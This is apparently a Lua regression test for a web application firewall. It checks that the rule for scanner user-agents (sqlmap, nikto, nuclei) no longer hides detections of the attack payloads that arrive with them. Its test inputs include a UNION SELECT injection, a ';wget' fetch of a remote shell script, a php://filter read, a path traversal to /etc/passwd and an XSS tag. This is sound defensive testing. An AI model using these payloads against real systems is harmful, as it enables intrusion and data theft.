-- Rule 201 (bad UA) shadowed the armed families (edge Lua sweep 2026-10-09,
-- PR 10b). A score >= 99 scanner identity (sqlmap, nikto, nuclei …) blocks,
-- but WAF_BAD_UA has no block-tier rule, so its autoblock is not armed.
-- Recorded at step 1 it was the first block hit: it owned the headline, `goto
-- done` skipped every later rule, and cfm.lua pushes only the headline, so
-- sqlmap's own SQLi payload never reached the 6h ban or the alert. The block
-- is recorded after the armed families now (before the held traversal).

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}
package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function run(t)
  local hit, reason, _, action, hits, rule_id = waf.check({
    skip_rule_ids = t.skip,
    uri = t.uri or "/index.php", args = t.args or "", raw_uri = t.raw_uri or ((t.uri or "/index.php") .. "?" .. (t.args or "")),
    method = t.method or "GET", ip = "203.0.113.5", body = t.body or "",
    headers = { ["user-agent"] = t.ua, accept = "*/*", ["content-type"] = t.ct },
  })
  local last = hits and hits[#hits]
  local ids = {}
  for _, h in ipairs(hits or {}) do ids[#ids + 1] = tostring(h.waf_rule_id) end
  return { hit = hit, reason = tostring(reason), action = action, rule_id = rule_id,
           ids = "," .. table.concat(ids, ",") .. ",", last = last and last.waf_rule_id,
           also = "," .. table.concat(waf.also_rule_ids(hits, rule_id), ",") .. "," }
end
local function show(r) return r.reason .. "/" .. tostring(r.action) .. " id=" .. tostring(r.rule_id) .. " hits=" .. r.ids end
local SQLMAP = "sqlmap/1.8.2#stable (https://sqlmap.org)"

-- ── The armed family owns the headline; 201 stays in the hits ──────────────
do
  local r = run{ ua = SQLMAP, args = "id=1%27%20UNION%20SELECT%201,2,3--%20-" }
  check(r.reason:find("^WAF_SQLI") and r.action == "block", "sqlmap + UNION SELECT: SQLi is the headline (" .. show(r) .. ")")
  check(r.ids:find(",201,", 1, true), "sqlmap + SQLi: the 201 hit is kept (" .. show(r) .. ")")
  check(r.last == 201 and r.also:find(",201,", 1, true), "sqlmap + SQLi: 201 appended at ::done::, in also_rule_ids (" .. show(r) .. ")")

  r = run{ ua = "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))",
           args = "cmd=x;wget%20http://198.51.100.9/x.sh" }
  check(r.reason:find("^WAF_RCE") and r.action == "block", "nuclei + ;wget: RCE is the headline (" .. show(r) .. ")")
  check(r.ids:find(",201,", 1, true), "nuclei + RCE: the 201 hit is kept (" .. show(r) .. ")")

  r = run{ ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)", args = "f=php://filter/resource=index.php" }
  check(r.reason:find("^WAF_PHP_WRAPPER") and r.action == "block" and r.ids:find(",201,", 1, true),
        "nikto + php://: PHP_WRAPPER is the headline, 201 kept (" .. show(r) .. ")")
end

-- ── Unchanged: a scanner with no armed payload still blocks as 201 ─────────
do
  local r = run{ ua = SQLMAP, args = "id=1" }
  check(r.reason:find("^WAF_BAD_UA:UA_SQLMAP") and r.action == "block" and r.rule_id == 201,
        "sqlmap alone blocks as 201 (" .. show(r) .. ")")
  -- Before the held traversal rule: the label stays 201 and its block ends
  -- evaluation, so traversal does not run.
  r = run{ ua = SQLMAP, args = "f=../../../../etc/passwd" }
  check(r.reason:find("^WAF_BAD_UA") and r.action == "block" and not r.ids:find(",101,", 1, true),
        "sqlmap + traversal: 201 keeps the headline, 101 not reached (" .. show(r) .. ")")
  -- A per-vhost exclusion of 201 still drops it; traversal then blocks.
  r = run{ ua = SQLMAP, args = "id=1", skip = { [201] = true } }
  check(not r.hit, "sqlmap with 201 excluded: no hit (" .. show(r) .. ")")
  r = run{ ua = SQLMAP, args = "f=../../../../etc/passwd", skip = { [201] = true } }
  check(r.reason:find("^WAF_TRAVERSAL") and not r.ids:find(",201,", 1, true), "sqlmap + traversal, 201 excluded: traversal (" .. show(r) .. ")")
  -- A challenge-tier payload behind it: the request still ends in a block.
  r = run{ ua = SQLMAP, args = "q=%3Cscript%3Ealert(1)%3C/script%3E" }
  check(r.action == "block" and r.rule_id == 201, "sqlmap + XSS (challenge tier): still a 201 block (" .. show(r) .. ")")
  -- A held block rule earlier than the deferred spot owns the headline (both
  -- un-armed at the shipped defaults; documented trade-off).
  r = run{ ua = SQLMAP, method = "POST", uri = "/wp-admin/admin-ajax.php", ct = "application/x-www-form-urlencoded",
           body = "action=trp_get_translations_regular&security=abc&language=en_US&string_ids=%5B680%5D" }
  check(r.rule_id == 10019 and r.ids:find(",201,", 1, true), "sqlmap + TranslatePress id lookup: 10019 headline, 201 kept (" .. show(r) .. ")")
  -- A browser UA is untouched.
  r = run{ ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
           args = "id=1%27%20UNION%20SELECT%201,2,3--%20-" }
  check(r.reason:find("^WAF_SQLI") and not r.ids:find(",201,", 1, true), "browser + SQLi: no 201 (" .. show(r) .. ")")
end

-- ── A rule that raises behind the deferred block still blocks as 201 ──────
-- At step 1 the block stopped evaluation; now later rules run, and under
-- fail_open a raise would let the scanner through uninspected.
do
  local det = require("cfm_waf_detectors")
  local orig = det.detect_rce
  det.detect_rce = function() error("boom") end
  local function restore() det.detect_rce = orig end
  local ok, hit, reason, _, action, hits, rule_id = pcall(waf.check, {
    uri = "/index.php", args = "id=1", raw_uri = "/index.php?id=1", method = "GET", ip = "203.0.113.5", body = "",
    headers = { ["user-agent"] = SQLMAP, accept = "*/*" } })
  check(ok and hit and action == "block" and rule_id == 201 and tostring(reason):find("^WAF_BAD_UA")
        and hits and hits[1] and hits[1].waf_rule_id == 201,
        "sqlmap + a raising rule: blocked as 201 (" .. tostring(ok) .. " " .. tostring(reason) .. ")")
  ok = pcall(waf.check, {
    uri = "/index.php", args = "id=1", raw_uri = "/index.php?id=1", method = "GET", ip = "203.0.113.5", body = "",
    headers = { ["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", accept = "*/*" } })
  check(not ok, "browser + a raising rule: the error still goes up (cfm.lua's fail_open decides)")
  ok = pcall(waf.check, {
    uri = "/index.php", args = "id=1", raw_uri = "/index.php?id=1", method = "GET", ip = "203.0.113.5", body = "",
    skip_rule_ids = { [201] = true }, headers = { ["user-agent"] = SQLMAP, accept = "*/*" } })
  check(not ok, "sqlmap with 201 excluded + a raising rule: the error goes up")
  -- A nil ctx: the real error goes up, not one from the handler.
  local _, err = pcall(waf.check, nil)
  check(tostring(err):find("boom", 1, true),
        "nil ctx: the handler does not mask the error (" .. tostring(err) .. ")")
  restore()
end

if fails > 0 then
  io.stderr:write(("bad UA shadow tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: rule 201 block no longer shadows the armed families")
